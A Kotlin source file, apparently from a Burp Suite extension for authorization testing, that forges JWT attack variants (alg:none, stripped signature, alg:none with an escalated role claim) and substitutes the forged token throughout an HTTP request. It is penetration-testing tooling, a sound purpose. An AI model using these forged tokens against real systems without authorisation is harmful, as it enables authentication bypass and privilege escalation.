package com.authzmatrix.core

import burp.api.montoya.http.message.HttpHeader
import burp.api.montoya.http.message.requests.HttpRequest
import org.json.JSONObject

/**
 * Forges JWT attack variants to test server-side verification. These are deliberately invalid
 * tokens: if the server accepts one, its JWT validation is broken.
 */
object JwtForge {

    /** alg:none, signature removed — the classic "none" attack. */
    fun algNone(info: JwtInfo): String {
        val h = JSONObject(info.header.toString()).put("alg", "none")
        return "${Jwt.encode(h.toString())}.${Jwt.encode(info.payload.toString())}."
    }

    /** Keep header + payload, drop the signature (tests servers that don't verify at all). */
    fun stripSignature(info: JwtInfo): String =
        "${Jwt.encode(info.header.toString())}.${Jwt.encode(info.payload.toString())}."

    /** alg:none with an escalated role claim (tests broken verification + privilege escalation). */
    fun escalateRole(info: JwtInfo, roleClaim: String, roleValue: String): String {
        val p = JSONObject(info.payload.toString()).put(roleClaim, roleValue)
        val h = JSONObject(info.header.toString()).put("alg", "none")
        return "${Jwt.encode(h.toString())}.${Jwt.encode(p.toString())}."
    }

    /** Detect which claim key holds the role, for the escalation default. */
    fun roleClaimKey(info: JwtInfo): String? =
        listOf("role", "roles", "authorities", "scope", "permissions", "groups")
            .firstOrNull { info.payload.has(it) }

    /**
     * Replace a raw token wherever it actually lives in the request — **every** header, the path/
     * query and the body. Replacing only the first hit would leave a real credential behind when
     * the same token is also present in a cookie, an X-Auth-Token header or the body, and the
     * server might authenticate with the leftover one instead of the forged token.
     */
    fun replaceToken(req: HttpRequest, oldTok: String, newTok: String): HttpRequest {
        var out = req

        val changed = req.headers()
            .filter { it.value().contains(oldTok) }
            .map { HttpHeader.httpHeader(it.name(), it.value().replace(oldTok, newTok)) }
        if (changed.isNotEmpty()) out = out.withUpdatedHeaders(changed)

        val path = out.path()
        if (path.contains(oldTok)) out = out.withPath(path.replace(oldTok, newTok))

        val body = out.bodyToString()
        if (body.contains(oldTok)) out = out.withBody(body.replace(oldTok, newTok))

        // Fallback (token not located verbatim): assume Bearer in Authorization.
        return if (out !== req) out else setHeader(req, "Authorization", "Bearer $newTok")
    }

    private fun setHeader(req: HttpRequest, name: String, value: String): HttpRequest =
        if (req.hasHeader(name)) req.withUpdatedHeader(name, value) else req.withAddedHeader(name, value)
}
